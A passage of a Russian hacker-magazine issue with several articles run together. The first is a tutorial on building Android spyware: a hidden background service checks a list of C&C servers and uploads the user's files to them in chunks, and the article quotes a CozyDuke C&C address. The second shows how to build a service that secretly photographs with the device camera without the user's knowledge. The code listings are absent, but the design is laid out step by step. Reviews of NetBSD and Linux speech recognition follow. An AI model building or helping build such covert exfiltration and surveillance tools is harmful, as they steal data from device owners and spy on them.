Класс PresentFunc свяжет сетевую и файловую часть приложения. В главном
Activity приложения работа с ним сведется только к вызову метода sendFile.
Поскольку данный класс не может работать самостоятельно, в конструкторе
должны быть указаны необходимые переменные. Тут же подпишемся на об-
новления, которые будут происходить в сетевом модуле:





НА СТАРТ!
Теперь подумаем, как запускать процессы поиска и отправки данных. Для это-
го подойдет класс Service, позволяющий делать практически любые опе-
рации в фоне и незаметно для пользователя. Запустить его поможет класс
AlarmManager, более подробно об использовании которого ты можешь почи-
тать в статье моего коллеги «Хакерский cron для Android» — очень рекомендую
к прочтению.





СОЗДАЕМ ОБЪЕКТЫ
Как  ты,  наверное,  уже  понял,  все  объекты  будут  инициализированы
в MainService:
Установив на устройстве такой сервис, злоумышленник будет иметь доступ
практически ко всему содержимому устройства.

ОТПРАВЬ МЕНЯ БЕРЕЖНО
Главная задача любой APT — передать данные на сервер с максимально низ-
кими потерями. Не секрет, что мобильные устройства не обладают постоян-
ным и, самое главное, стабильным доступом в интернет. Частично восстанов-
ленные изображения малоинтересны, а файловые архивы могут вообще
не открыться. Хорошо написанная сетевая часть позволит передать докумен-
ты и фотографии с минимальными потерями даже на слабом канале.

ДОСТУПНОСТЬ СЕРВЕРОВ УПРАВЛЕНИЯ
В отчетах о APT-сетях обязательно фигурирует информация
о том, как они управлялись хозяином. Чаще всего это не-
сколько так называемых C&C (command and control) серве-
ров, к которым модули APT обращаются за получением новых
команд. Чем крупнее сеть, тем больше у нее C&С-адресов.     WWW
  Чем успешнее малварь, тем короче жизнь C&C-сервера.
                                                                                Отчет по APT
Провайдер может отобрать хостинг из-за жалоб, а в особых                                                                               CozyDuke
случаях домен может быть вообще разделегирован реги-
стратором. В некоторых случаях доменные имена C&C пере-      Исследование
                                                                                        Trend Microходят к антивирусным компаниям. Если APT-сеть была доста-
точно успешна, на потерянном домене будет создан honeypot     «Хакерский cron
или просто поставлена заглушка с информацией о том, что       для Android»
данный адрес имеет нехорошую историю.
  В самом простом случае С&С-адреса возможно хранить в обычном стро-
ковом массиве. Чтобы понять, какой из наших серверов жив и готов отдавать
команды, организуем проверку доступности.
   Реализовывать сетевую логику будем с помощью библиотеки Retrofit. Осе-
нью появился стабильный релиз второй версии, его мы и возьмем. Взаимо-
действие с сервером организуем на основе формата обмена данными JSON.
   Убедимся, что сервер настроен правильно и готов работать, для этого
сформируем GET-запрос, на который должен прийти JSON-ответ в следую-
щем виде:



JSON-формат не обязательно разбирать руками: в Сети есть несколько он-
лайн-генераторов Java-кода.
Рис. 2. Многообразие APT по версии «Лаборатории Касперского»





Теперь создадим интерфейс HTTP-запроса, а затем сформируем объект клас-
са Retrofit, в котором будет все необходимое для обращения к C&C-серверу:
Как видишь, Retrofit сильно упрощает создание сетевых запросов. Мы уже
писали про него в статье о библиотеках, рекомендую тебе ее пролистать.





Если C&C жив и ответит нам, будет вызван метод onResponse, в котором че-
рез метод body() будет доступен объект класса PingRequest. О доступности
сервера мы оповестим Presenter с помощью паттерна «Наблюдатель»: методы
setChanged и notifyObservers отправят сообщения подписанным на networkFunc
объектам.

ПРОВЕРКА СЕТЕВОГО СОЕДИНЕНИЯ
Теперь еще рассмотрим момент, который незначителен для стационарных си-
стем, но важен при работе с мобильными устройствами. Как рядовой пользо-
ватель определяет, что с устройством что-то не так? Аппарат либо тормозит,
либо быстро разряжается. Задержки в работе устройства лечатся рефакто-
рингом кода, а сейчас разберемся, как лишний раз не выполнять ресурсоза-
тратные операции.
  Перед отправкой данных проверим, есть ли в данный момент у устрой-
ства доступ в интернет. Для этого нальем кода в уже объявленный метод
isInternetAvail. В Android есть класс ConnectivityManager, который предоставит
нам информацию о состоянии сети на устройстве:




Поскольку нам мало просто  знать, что сеть имеется, вызовем метод
getActiveInfo() и перебором выясним, какого качества подключение сейчас
доступно. К примеру, можно запускать передачу файлов, только если доступ-
на Wi-Fi-сеть или LTE.





ОТПРАВКА ДАННЫХ
В отчете компании Trend Micro подробно рассказано о том, как в сетевом тра-
фике заметить активность вредоносов. APT Taidoor и IXESHE используют
GET-запросы, а Enfal в некоторых случаях отправляет данные через POST. Это
вполне логичная модель взаимодействия в современных приложениях: в сети,
к которой подключен пользователь, всегда будет доступ к веб-ресурсам,
а остальные порты вполне могут быть закрыты.
  Еще одна APT под названием СozyDuke, согласно отчету «Лаборатории Кас-
перского», отправляет данные на сервер, меняя значения переменных в адре-
се запроса на C&C. В теле такой малвари изначально зашит
адрес скрипта на C&C, к которому будет осуществляться
запрос, к примеру вот такой:

209.200.83.43/ajax/search.php

Затем, в зависимости от ситуации, к скрипту подставляются                                                          INFO
значения различных переменных: status=, name= и так да-
лее. По сформированному адресу отправляется POST-за-       Корпоративная
                                                                                       почта, мобильныепрос, в тело которого могут быть добавлены дополнитель-                                                                             версии офисных
ные данные.                                                                          программ — все
  Применим на практике подход создателей CozyDuke,       готово для того,
но всю полезную нагрузку поместим в тело запроса. По-     чтобы коммерческая
                                                                                 тайна оказалась
скольку при нестабильной мобильной связи проблематич-                                                                          и на устройствах
но в одной сессии отправить файл более одного мегабай-       на базе Android!
та, будем разбивать передачу файлов на несколько сеансов связи. Для этого
введем переменные с именем файла (filename), номером передаваемой части
(partOffset) и содержимым (filePart).
   Передавать файл частями возможно благодаря классу FileInputStream. Он
позволяет считать кусок файла по указанному смещению в массив байтов:





Объявленный ранее метод sendData примет на вход все три параметра, а за-
тем сформирует запрос к C&C. Строить сетевое взаимодействие будем с по-
мощью Retrofit, для этого нужно будет только указать адрес запроса, сформи-
ровать заголовок и указать объект, который будет телом:





Теперь надо создать объект на основе данных из файла и передать его в Retrofit,
дальше библиотека сама добавит нужные параметры и отошлет запрос:




Нам потребуется опять использовать паттерн «Наблюдатель». Дело в том, что
Retrofit не умеет создавать очередь из нескольких запросов: после формиро-
вания запроса сразу создается новый поток и данные отправляются в сеть.
Это неудобно, поскольку файл может быть разбит на приличное число фраг-
ментов, а создавшее с сотню потоков приложение, скорее всего, исчерпает
выделенную ей память и будет принудительно завершено системой.





В Presenter будет вызван метод onUpdate, что будет означать удачную доставку
части файла к серверу, а значит, можно снова вызывать sendData со следую-
щей частью файла.





Рис. 3. Так запрос выглядит в Wireshark

ДЕКОДИРОВАНИЕ
Похожим образом можно также и загружать файлы с сервера на устройство.
Целей может быть много: от обновлений до подмены данных на устройстве.
Согласно спецификации JSON, массив байтов будет представлен массивом
переменных. К примеру, заголовок JPG-файла будет выглядеть вот так:



Получить массив байтов возможно с помощью несложного цикла:





РАБОТА БУДЕТ!
Мир угроз расширяется так же быстро, как и новые технологии проникают
в нашу жизнь. При этом самообразование очень многих зачастую останавли-
вается, практически не начавшись, чем и пользуются злоумышленники.
   Вредоносное ПО интересно с точки зрения использования новых техноло-
гий и социальной инженерии. Для лучшего понимания статьи на нашем сай-
те ты найдешь исходники созданного сегодня приложения. Мы много пишем
о вирусах, но хотим, чтобы полученные знания ты применял только в легальных
проектах, и ждем от тебя полезных приложений в Google Play. Удачи!
КОДИНГ



УЛЫБАЙТЕСЬ, ВАС
СНИМАЕТ ANDROID
СОЗДАЕМ СЕРВИС ДЛЯ СКРЫТОЙ СЪЕМКИ
НА СОВРЕМЕННОМ ANDROID API





                                       Андрей Пахомов
                                            mailforpahomov@gmail.com
ИНТРО
Мир Android развивается очень бурно, и мы, разработ-
чики, имеем счастье каждый день узнавать что-то новое
и тем самым становиться лучше. Технологии, которые
были передовыми год назад, уже могут быть не так эф-
фективны. К примеру, начиная с API версии 21 был введен                                               WARNING
новый класс Camera2, предоставляющий возможность
управлять камерой. Старому классу Camera присвоен     Вся информация предо-
                                                                            ставлена исключительностатус deprecated: это значит, что он все еще доступен                                                                           в ознакомительных целях.
для использования, но уже очень скоро его исключат     Ни редакция, ни автор
и на новых устройствах этот класс работать не будет. Мы      не несут ответственно-
                                                                             сти за любой возможныйориентируемся на перспективу, для этого сегодня мы
                                                                              вред, причиненный мате-
изучим новые возможности, разобравшись, зачем же он                                                                     риалами данной статьи.
же пришел на смену старому.

КОНВЕЙЕР КАК КОНЦЕПЦИЯ





Паттерн pipeline и класс Camera2

Хоть названия классов и схожи, концепция работы серьезно изменилась. Мо-
дель работы камеры представлена в виде конвейера (pipeline). Это паттерн
ООП, который предполагает использование многопоточной разработки с це-
лью последовательного преобразования объекта, выводимого как конечный
результат. В нашем случае мы подключаемся к камере, задаем параметры
съемки и получателя сформированного изображения. Камера — это физиче-
ский объект, поэтому для повышения производительности и экономии ресур-
сов устройства целесообразно все вычисления возложить на дополнительные
потоки. Сейчас ты увидишь, что это не только не страшно, но и полезно! :)

МАХМУД, ПОДЖИГАЙ! (С)
Настало время применить на практике новый API. Интересно будет разо-
браться, как теперь решается одна из наших любимых задач: создать прило-
жение, которое в фоне может делать фотографии без ведома пользователя.
   Как обычно в Android, начнем мы с добавления пермишенов в мани-
фест-файл. Сегодня нам нужен доступ к камере.



Основную работу начнем с получения доступа к камерам на нашем устрой-
стве, в этом нам поможет класс CameraManager. Это менеджер системного
сервиса, который позволяет найти доступные камеры, подсоединиться к лю-
бой из них и задать для нее настройки съемки.




Вообще, максимально широкое использование многопоточности — это тренд
современной разработки под Android. Работа с сетью, физическими датчика-
ми на устройстве, обработка полученной информации — это все очень ре-
сурсозатратные и часто долговременные операции. Порождение дополни-
тельных потоков позволяет не только по максимуму использовать все ресурсы
аппарата (все современные мобильные устройства обладают многоядерными
процессорами), но и создать у пользователя ощущение «легкости»: в основ-
ном потоке ведется только отображение элементов интерфейса.
  Формирование картинки начнем с создания новых потоков и обработчиков
событий. Сперва создадим новый поток, который будет висеть в фоне и ждать
команды на выполнение какой-либо операции. Он будет нам полезен при за-
дании настроек камеры и передаче картинки между объектами.





Камера — довольно сложное и не самое быстро реагирующее физическое
устройство. По сравнению с вычислениями в памяти устройства перевод каме-
ры из состояния в состояние может занимать целую вечность. Поэтому опера-
ции с камерой будут выполняться вне главного потока, а изменения состояния
камеры мы будем отлавливать с помощью обработчиков событий. К приме-
ру, инициализируем в нашем приложении объект CameraDevice.StateCallback,
один из методов которого будет вызван после того, как на устройстве откро-
ется камера.





Еще нам потребуется отслеживать тот момент, когда нам станет доступна
картинка, снятая камерой. Организация передачи картинки с камеры дру-
гим объектам — довольно ресурсозатратный процесс, поэтому он тоже бу-
дет выполняться в фоне. Для этого существует объект CameraCaptureSession.
CaptureCallback, его метод onCaptureCompleted будет вызван после захвата
камерой изображения.





   Теперь определимся, как мы будем обрабатывать полученное изобра-
жение. Сформированное с помощью класса CameraCaptureSession изобра-
жение будет доступно в виде объекта Surface. Это обертка для фотогра-
фий, сделанных с помощью класса Camera2. Специально для работы с ним
создан  класс  ImageReader.  Воспользуемся  интерфейсом  ImageReader.
OnImageAvailableListener, метод onImageAvailable в созданном объекте будет
вызван сразу, как только картинка станет доступна.





ФОТОГРАФИРУЕМ
Для начала нужно определиться, с какой именно камеры мы будем сни-
мать данные, ведь на устройстве их может быть несколько. У каждой ка-
меры есть уникальный идентификатор, организуем небольшой пере-
бор с использованием уже объявленного нами объекта manager и класса
CameraCharacteristics.





Объект класса CameraCharacteristics содержит в себе физические параметры
камеры под номером cameraId. Нас сейчас интересует, в какую сторону направ-
лена камера. Камеры могут быть трех типов: фронтальная (LENTS_FACING_
FRONT), задняя (LENS_FACING_BACK) и внешняя (LENS_FACING_EXTERNAL).
Камеру не для селфи мы будем искать методом исключения.





Теперь нужно разобраться, какого качества фотографии можно получить
с камеры. Объект класса SteamConfigurationMap будет содержать в себе
информацию о поддерживаемых разрешениях изображения для вы-
бранного режима съемки. Тут мы воспользовались данными из класса
CameraCharacteristics, он позволяет управлять многими другими параме-
трами камеры: фокусом, чувствительностью и так далее. Сегодня мы к нему
еще вернемся.




Для организации конвейера нужно обязательно задать конечного получателя,
это будет объект уже знакомого нам класса ImageReader. Зададим размеры
фотографии (тут как раз пригодился объект map), а как только картинка сфор-
мируется, вызовем уже созданный нами обработчик mOnImageAvailableListener.
Чтобы интерфейс приложения не ждал завершения этой операции, переда-
дим все потоку mBackgroundHandler.
Последним аргументом в методе указано количество фотографий, которое
будет сделано с камеры. С первой попытки хорошая фотография не получит-
ся, чуть позже ты поймешь почему.
   Итак, все приготовления мы выполнили. Поскольку мы уже определились,
чем будем снимать, можно отдать команду на открытие камеры.




Как только камера откроется, мы попадаем в мир многопоточного программи-
рования под Android: системой будет вызван описанный выше метод onOpened
класса CameraDevice.StateCallback. При желании уже на этом этапе можно по-
лучить картинку с камеры и сбросить ее в файл. Но результат будет плачевный:
камера не сфокусирована, светочувствительность низкая... Как в настоящем
фотоаппарате, камерам в планшетах и смартфонах нужно некоторое время,
чтобы осмотреть окружающий мир и настроиться на работу. Дадим ей эту воз-
можность, создав «тренировочный» снимок.





Сейчас мы указали, что требуется орга-
низовать  передачу  картинки  с камеры
в слабом качестве (TEMPLATE_PREVIEW).
По замыслу  разработчиков, сформиро-
ванный объект Surface следует вывести
на экран с помощью классов SurfaceView
и  TextureView.  Поскольку  изображение
не может уходить «в никуда» (мы получим
ошибку NullPointerException), направим все
в mImageReader.
   Теперь нам нужно дождаться момента,
когда камера будет готова к работе и нач-
нет передавать данные на конвейер. Да,
у нас опять асинхронность, и сейчас эста-
фета  переходит  следующему  объекту.
Мы  задействуем  CameraCaptureSession.
StateCallback, методы которого вызывают-
ся при изменении состояния потоков дан-                                              Предпоказ изображения
ных с камеры.                                     с TextureView
В частности, нас интересует ситуация, когда камера уже включилась и может
отправлять данные. Как настоящие профи-фотографы, мы выставим пара-
метры съемки, так как сейчас камера передает совершенно не настроенное
изображение. У нас будет включен автофокус, при желании можно добавить
вспышку, настроить баланс белого и прочее.





Метод capture отправляет обновленные настройки на камеру с указа-
нием конечного получателя изображения. Как ты уже понял, все дей-
ствия с камерой ресурсозатратны, поэтому выполнять их будет наш поток
mBackgroundHandler. Фотокамера — вещь капризная, изображение, по-
лученное на данном этапе, еще не будет достаточно качественным. Хоть
мы и указали, что нам нужен автофокус, он не выставляется моменталь-
но, поэтому первые кадры с камеры можно назвать пристрелочными. Нуж-
но уловить момент, когда камера окончательно настроится, и только тог-
да сохранить получившееся изображение. В этом нам поможет метод
onCaptureCompleted объекта CameraCaptureSession.CaptureCallback. Он
вызывается каждый раз, когда произошел захват изображения камерой.
Мы удостоверимся, что камера захватила фокус, затем запустим процесс
захвата и сохранения картинки в файл.





Принцип формирования окончательной фотографии такой же, как и при на-
стройке камеры: нужно выставить параметры съемки, а затем указать получа-
теля фотографии. После чего фотография будет доступна уже в рассмотрен-
ном нами объекте ImageReader.OnImageAvailableListener.





Запись фотографии мы уже привычно поручили объекту mBackgroudHandler.
Камера нам выдала несколько изображений, последняя будет самой каче-
ственной, именно ее мы вытащим методом acquireLatestImage, а предыдущие
фотографии будут выброшены из памяти.

ЗАКЛЮЧЕНИЕ
У нас получилось! Сегодня мы пробрались сквозь дебри
многопоточного программирования под Android и получи-
ли качественную фотографию с камеры. Весь исходный код
созданного нами приложения есть на сайте, рекомендую его
тоже посмотреть. Да, класс Camera2 требует вдумчивого из-
учения и тщательной проработки действий. Но зато теперь
у нас есть инструмент для полного контроля над камерой,    WWW
что позволяет создавать более гибкие и удобные приложе-
                                                                      Пример работыния. Надо сказать, что механизмы организации многопоточ-                                                                               с камерой от Google
ности в Android не самые удобные, но это не значит, что они
неэффективны. Уверен, теперь ты сможешь по максимуму   Рекомендую изучить
                                                                        официальнуюиспользовать ресурсы устройства, создавая сбалансиро-
                                                                       документацию по API
ванные приложения на радость пользователям. Если оста-
лись какие-то вопросы, обязательно пиши. Удачи!


В статью вошли не все технические моменты, рекомендую внимательно про-
бежаться по исходному коду и примерам от Google.
UNIXOID
ТУРNETBSD, RUMP-ЯДРАПО BSD
 И PKGSRC





                                                                                 Евгений Зобнин
                                                                                                                 androidstreet.net
«Конечно, оно работает на NetBSD» — таков официальный
слоган операционки, которой посвящен сегодняшний об-
зор. Долгое время NetBSD держала первенство как самая
портабельная ОС в мире и, если говорить о технической
стороне вопроса, до сих пор продолжает лидировать. Это
единственная BSD, способная запускать драйверы, фай-
ловую систему и сетевой стек в пространстве пользова-
теля, а сами драйверы здесь можно писать на скриптовом
языке Lua. Компоненты этой системы ты можешь найти
везде, начиная от роутеров и заканчивая смартфонами
и игровыми консолями.


ИСТОКИ
NetBSD — первая из доживших до наших дней BSD-система, отпочковавша-
яся от 386BSD. В 1993 году группа разработчиков, в составе которой был Тео
де Раадт, скопировала исходный код 386BSD, интегрировала в него неофици-
альные патчи и другие наработки, а также некоторые компоненты BSD Net/2
и выпустила NetBSD 0.8. Девизом новой ОС стала полностью открытая мо-
дель разработки, высокое качество кода и хорошая портируемость, а слово
Net в начале имени означало ориентированность ОС на применение в сети
Интернет и распределенный принцип разработки.
   Сегодня NetBSD уже доросла до версии 7.0, и ее развитие все больше
ускоряется. В том или ином виде NetBSD можно встретить повсюду, включая
многие модели роутеров и встраиваемой электроники. На NetBSD основана
операционка карманной игровой консоли Sony PSP, высокоуровневые части
системы используются в MINIX 3, Android (toolbox — набор инструментов ко-
мандной строки, правда недавно он был заменен на Toybox), DragonFly BSD
(система управления портами/пакетами pkgsrc) и огромном количестве дру-
гих систем.
  Но почему NetBSD до сих пор жива как цельная система и кому нужно ее
развитие, когда все силы можно бросить на разработку той же FreeBSD? Тут
все дело в банальной философии разработчиков и векторе развития проекта.
Разработчики NetBSD пропагандируют написание кода с оглядкой на макси-
мальную переносимость и, как следствие, качество и модульность, без всяких
поблажек. И если с командой OpenBSD их интересы в основном пересекают-
ся, то FreeBSD, которая уже давно превратилась из идейной академической
ОС в мейнстримовый продукт, точно идет совсем другим путем.
Процесс загрузки NetBSD

В целом люди работают над NetBSD ради фана и получения опыта, а сама си-
стема — это очень хороший полигон для экспериментов и опробования идей.
И появившаяся в последних версиях экспериментальная система rump-ядер
и скриптинга ядра — самое красноречивое тому доказательство. NetBSD —
это чисто академическая ОС, которая тем не менее отличается высоким каче-
ством кода, простотой и стабильностью. А компактность и простота портиро-
вания на новое железо делает ее прекрасным решением для встраиваемой
электроники.


                                                              Инсталлятор
                                                           NetBSD
ПЕРЕНОСИМОСТЬ
Сборки NetBSD 7.0 доступны для 58 архитектур, включая 16 различных се-
мейств CPU, а в списке поддерживаемых присутствуют все популярные пла-
ты для разработчиков, в том числе Raspberry Pi 2, ODROID-C1, BeagleBoard
и Cubieboard2.





Тостер под управлением NetBSD

Ты можешь сказать, что в сравнении с тем, где работает Linux, 58 архитектур —
это ерунда, и будешь прав. Но только отчасти. Дело в том, что между терми-
нами «переносимость» и «количество поддерживаемых платформ» существу-
ют коренные различия. Linux доступен для такого большого числа платформ
не потому, что он так прекрасно и просто портируется, а из-за банальной по-
пулярности. Любой, кто плотно работал с кодом ядра Linux, знает, что, несмо-
тря на то что в ядре, в общем-то, соблюдается разделение на платформенно
зависимый/независимый код, зачастую оно нарушается, а само ядро пред-
ставляет собой большой запутанный комок кода. Код NetBSD, напротив, четко
структурирован и имеет несколько слоев абстракций от железа.
  Драйверы в NetBSD полностью абстрагированы от платформы, включая
такие ее компоненты, как шина ввода-вывода, DMA, прерывания или что угод-
но еще. Драйвер работает исключительно с абстрактными сущностями, что
позволяет использовать его на любой архитектуре вообще без модификаций.
Более того, один и тот же драйвер можно брать для разных версий перифе-
рии, подключаемой к разным шинам. На странице NetBSD приводится при-
мер драйвера fxp для сетевых карт Intel. Один и тот же драйвер используется
для архитектур alpha, arc, cats, cobalt, i386, macppc, prep, и он же — для PCI-
и Cardbus-версий сетевой карты без всякого дополнительного кода. На самом
деле ядро NetBSD настолько грамотно разделено на независимые слои, что
даже процесс портирования на новую архитектуру здесь значительно проще,
чем в других ОС. Портирование NetBSD на x86_64 в свое время заняло всего
месяц, тогда как у разработчиков Linux на это ушло полгода. А теперь пред-
ставь, насколько разные по количеству участников команды это делали!

RUMP-ЯДРО
Одним из побочных эффектов разделения кода NetBSD на независимые слои
стала концепция так называемых rump-ядер. Технология позволяет запустить
сильно урезанный и облегченный вариант ядра NetBSD в пространстве поль-
зователя как обычный процесс или даже собрать его в форме разделяемой
библиотеки. При этом в таком ядре могут работать почти любые драйверы
или подсистемы (стек TCP/IP, например), запросы которых к оборудованию
будут происходить с помощью специальных гипервызовов к основному ядру.
Если не вдаваться в детали, это означает, что, по сути, из NetBSD можно сде-
лать нечто вроде микроядерной ОС, в которой драйверы, файловые систе-
мы и ключевые компоненты ядра будут работать в обособленных процессах
(список компонентов, которые можно вынести в пространство пользовате-
ля). В случае с драйверами такой подход позволяет получить защиту от оши-
бок (ошибка в драйвере, работающем в отдельном процессе, не приведет
к падению всей ОС целиком), а в случае с другими компонентами — возмож-
ность использовать измененные варианты подсистем ядра для разных при-
ложений.
   Например, rump позволяет собрать Firefox, подключив к нему сетевой стек
NetBSD как библиотеку. Смысл здесь в том, что сетевой стек можно затюнин-
говать исключительно для Firefox, тогда как другое приложение может быть
собрано с другим вариантом сетевого стека, пригодным именно для него.
Более того, интерфейс гипервызовов, через который rump-ядра «общаются»
с основным ядром и железом, можно использовать напрямую, что позволяет
создавать по-настоящему быстрые приложения с минимальным оверхедом
на обработку запроса к оборудованию.
Сетевой стек и файловая система, собранные в форме rump-библиотек

Ну а самое интересное, что rump-ядра можно использовать не только
в NetBSD, но и в Linux, Android, NetBSD, FreeBSD, OpenBSD, DragonFly BSD,
Solaris и даже Windows. Все, что нужно, — это специальный модуль ядра
(драйвер), который будет обрабатывать гипервызовы. В любой из этих си-
стем можно использовать rump-ядро, то есть запускать драйверы, сетевой
стек, файловые системы или даже брандмауэр NetBSD как обычные про-
цессы или включать эти компоненты в другие приложения в форме разде-
ляемой библиотеки.

LUA В ЯДРЕ
Lua — очень простой скриптовый язык, предназначенный для встраивания
в другие приложения. Особенной популярностью Lua пользуется у разработ-
чиков игр (ярчайший пример — World of Warcraft), с его помощью они скрипту-
ют сцены из игры, дают возможность создавать моды или вообще реализуют
большую часть игры (как в случае с Grim Fandango, например). Поддержку Lua
можно найти и во многих настольных приложениях (Adobe Lightroom, Apache,
Snort, Wireshark), где этот язык служит для расширения функциональности и/
или написания плагинов.
Lua в ядре

  В NetBSD язык Lua можно использовать для скриптинга ядра. В теории воз-
можность скриптинга позволяет тонко настраивать ядро под себя, реализо-
вывать различные алгоритмы энергосбережения, обработки пакетов или даже
быстро прототипировать драйверы. Вот, например, код простейшего алгорит-
ма энергосбережения, который можно быстро затюнинговать под свои нужды
без необходимости пересобирать ядро:
В реальности пока поддержка Lua в ядре реализована только для логирования
событий (модуль systm) и управления энергосбережением (pmf), все осталь-
ные функции недоступны, но могут быть легко экспортированы в Lua с помо-
щью обычного модуля ядра и пары сотен строк кода на си.

PKGSRC
Как и в любой другой BSD-системе, в NetBSD есть соб-
ственная система управления так называемыми портами,
а если по-простому — набор скриптов для быстрой сбор-
ки приложений из исходников и формирования пакетов
для установки в систему. В NetBSD система портов носит     WWW
имя pkgsrc, однако ее отличие от других подобных реа-                                                                                          Иcriptable Operating
лизаций в том, что, как и сама ОС, pkgsrc обладает край-     Systems with Lua (pdf)
не высокой портируемостью. Pkgsrc из коробки работа-
                                                                               The Design andет практически в любой UNIX-подобной ОС, включая все                                                                                    Implementation of the
BSD-системы, Solaris, OS X, QNX и Linux. Более того, она                                                                                     Anykernel and Rump
может работать даже в Windows (cygwin) и Haiku (бывшая          Kernels (pdf)
OpenBeOS).
  В базе pkgsrc находится более 16 тысяч пакетов, а сама система уже
давно зарекомендовала себя как удобное средство установки пакетов *nix
в не слишком относящихся к UNIX операционных системах, таких, например,
как OS X. Более того, pkgsrc долго использовалась как основная система пор-
тов в DragonFly BSD и до сих пор используется в MINIX 3, а в разное время
существовали Linux-дистрибутивы, где pkgsrc служила единственным спосо-
бом установки приложений (свежий пример — DracoLinux). Ну и конечно же,
как и код самой NetBSD, код pkgsrc очень четко структурирован и просто кра-
сив. В этом смысле система портов FreeBSD — просто запутанный ад.

ВЫВОДЫ
Во всем остальном NetBSD достаточно стандартна и должна быть понятна
любому, кто до этого работал с другими BSD-системами. В системе есть все,
чтобы использовать ее как в продакшене, так и дома: журналируемая ФС (FFS
+ WAPBL), программный RAID, ZFS, поддержка SMP без глобальной блоки-
ровки, брандмауэры NPF и OpenBSD pf, активированные по умолчанию сред-
ства защиты от срыва стека (ASLR, mprotect, GCC ProPolice), 3D-ускорение
с использованием открытых драйверов, поддержка любых графических сред
и графических приложений и решенная проблема 2038!
   Основная же область, где хорошо покажет себя NetBSD, — это, конечно же,
встраиваемая электроника. Здесь среди полноценных ОС ей просто нет рав-
ных. Компактный и хорошо организованный код NetBSD также отлично подхо-
дит для изучения принципов работы операционных систем, да и для повыше-
ния навыков программирования тоже.
UNIXOID





                                        Артём Зорин
                                                temazorin@hotmail.com

РАЗГОВАРИВАЕМ
                 СОВРЕМЕННЫЕ СИСТЕМЫ
                 РАСПОЗНАВАНИЯ РЕЧИ
                 В LINUXС LINUX
Человека всегда привлекала идея управлять машиной
естественным языком. Возможно, это отчасти связано
с желанием человека быть НАД машиной. Так сказать, чув-
ствовать свое превосходство. Но основной посыл — это
упрощение взаимодействия человека с искусственным
интеллектом. Управление голосом в Linux с переменным
успехом реализуется без малого уже четверть века. Да-
вай разберемся в вопросе и попробуем сблизиться с на-
шей ОС настолько, насколько это только возможно.

СУТЬ ДЕЛА
Системы работы с человеческим голосом для Linux существуют давно, и их ве-
ликое множество. Но не все они корректно обрабатывают русскую речь. Не-
которые и вовсе заброшены разработчиками. В первой части нашего обзора
мы поговорим непосредственно о системах распознавания речи и голосовых
ассистентах, а во второй — рассмотрим конкретные примеры их использова-
ния на Linux-десктопе.
   Следует различать собственно системы распознавания речи (перевод речи
в текст или в команды), такие как, например, CMU Sphinx, Julius, а также при-
ложения на основе этих двух движков, и голосовые ассистенты, ставшие по-
пулярными с развитием смартфонов и планшетов. Это, скорее, побочный про-
дукт систем распознавания речи, дальнейшее их развитие и воплощение всех
удачных идей распознавания голоса, применение их на практике. Для Linux-де-
сктопов таких пока мало.
  Надо понимать, что движок распознавания речи и интерфейс к нему — это
разные вещи. Таков базовый принцип архитектуры Linux — разделение слож-
ного механизма на более простые составные части. Самая сложная работа
ложится на плечи движков. Обычно это скучная консольная программа, рабо-
тающая незаметно для пользователя. Пользователь же взаимодействует в ос-
новном с программой-интерфейсом. Создать интерфейс несложно, поэтому
основные усилия разработчики направляют именно на разработку открытых
движков распознавания речи.

ЧТО БЫЛО РАНЬШЕ
Исторически сложилось так, что все системы работы с речью в Linux развива-
лись не спеша и скачкообразно. Причина не в криворукости разработчиков,
а в высоком уровне вхождения в среду разработки. Написание кода системы
для работы с голосом требует высокой квалификации программиста. Поэто-
му, перед тем как начать разбираться с системами работы с речью в Linux, не-
обходимо сделать небольшой экскурс в историю. Была когда-то в IBM такая
чудесная операционная система — OS/2 Warp (Merlin). Вышла она в сентябре
далекого уже 1996 года. Кроме того, что она обладала очевидными преимуще-
ствами перед всеми остальными операционками, OS/2 была укомплектована
весьма продвинутой системой распознавания речи — IBM ViaVoice. Для того
времени это было очень круто, учитывая, что ОС работала на системах с 486-
м процессором с объемом ОЗУ от 8 Мбайт (!).
   Как известно, OS/2 проиграла битву Windows, однако многие ее компоненты
продолжили существовать независимо. Одним из таких компонентов стала та са-
мая IBM ViaVoice, превратившаяся в самостоятельный продукт. Так как IBM всегда
любила Linux, ViaVoice была портирована на эту ОС, что дало детищу Линуса То-
рвальдса самую передовую для своего времени систему распознавания речи.





OS/2 Warp — система, которую мы потеряли

К сожалению, судьба ViaVoice сложилась не так, как хотели бы линуксоиды.
Сам движок распространялся бесплатно, но его исходники оставались за-
крытыми. В 2003 году IBM продала права на технологию канадо-американ-
ской компании Nuance. Nuance, разработавшая, пожалуй, самый успешный
коммерческий продукт для распознавания речи — Dragon Naturally Speeking,
здравствует и ныне. На этом бесславная история ViaVoice в Linux практически
закончилась. За то короткое время, что ViaVoice была бесплатной и доступ-
ной линуксоидам, к ней разработали несколько интерфейсов, таких, напри-
мер, как Xvoice. Однако проект давно заброшен и ныне практически нерабо-
тоспособен.

ЧТО СЕГОДНЯ?
Сегодня все гораздо лучше. В последние годы, после
открытия исходников Google Voice API, ситуация с раз-
витием систем распознавания речи в Linux значитель-
но улучшилась, выросло качество распознавания. На-
пример, проект Linux Speech Recognition на основе        INFO
Google Voice API показывает очень неплохие результа-                                                                    Самое сложное
ты для русского языка. Все движки работают примерно       звено в машинном
одинаково: сначала звук с микрофона устройства юзе-        распознавании
                                                                          речи — естественныйра попадает в систему распознавания, после чего либо
                                                                            человеческий язык.
голос обрабатывается на локальном устройстве, либо
запись отправляется на удаленный сервер для даль-
нейшей обработки. Второй вариант больше подходит для смартфонов или
планшетов. Собственно, именно так и работают коммерческие движки — Siri,
Google Now и Cortana.
  Из всего многообразия движков для работы с человеческим голосом мож-
но выделить несколько активных на данный момент.

CMU SPHINX
Большая часть разработки CMU Sphinx ведется в уни-
верситете Карнеги — Меллона. В разное время над
проектом работали и Массачусетский технологический
институт, и покойная ныне корпорация Sun Microsystems.                                              WARNING
Исходники движка распространяются под лицензией
BSD и доступны как для коммерческого, так и для не-        Установка многих
                                                                           из описанных системкоммерческого использования. Sphinx — это не пользо-
                                                                          распознавания речи —
вательское приложение, а, скорее, набор инструментов,                                                                          нетривиальная задача!
который можно применить в разработке приложений
для конечных пользователей. Sphinx сейчас — это круп-
нейший проект по распознаванию речи. Он состоит из нескольких частей:
•  Pocketsphinx — небольшая быстрая программа, обрабатывающая звук,
   акустические модели, грамматики и словари;
•  библиотека Sphinxbase, необходимая для работы Pocketsphinx;
•  Sphinx4 — собственно библиотека распознавания;
•  Sphinxtrain — программа для обучения акустическим моделям (записям че-
   ловеческого голоса).

Проект развивается медленно, но верно. И главное — его можно использо-
